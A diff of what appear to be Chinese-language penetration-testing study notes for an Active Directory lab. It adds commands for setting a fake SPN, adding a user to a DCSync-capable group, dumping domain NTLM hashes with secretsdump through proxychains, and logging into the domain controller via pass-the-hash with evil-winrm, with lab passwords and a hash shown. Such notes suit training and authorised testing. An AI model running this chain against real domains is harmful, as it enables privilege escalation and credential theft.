@@ -388,8 +388,20 @@ C:\DotNetNuke\Portals\0> Set-DomainUserPassword -Identity ssmalls -AccountPasswo
 但如果这是唯一的路径
 与客户确认，多数客户会允许继续
 将此类更改记录在活动日志中，将其包含在报告的附录中
-
 proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86!      用 ssmalls 验证，不登陆连接
+或者
+不更改密码，创建假 SPN 账户
+C:\Share> $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
+C:\Share> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
+C:\Share> Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
+把加账户，放入权限组 （DCSync Privileges）
+C:\Share> $timpass = ConvertTo-SecureString 'Repeat09' -AsPlainText -Force
+C:\Share> $timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
+C:\Share> $group = Convert-NameToSid "Server Admins"
+C:\Share> Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
+sudo proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm      在 DC 提取 NTDS.dit 中的 NTLM 哈希
+proxychains evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2      连接到 DC
+
 
 用  Snaffler 搜刮
   https://github.com/SnaffCon/Snaffler
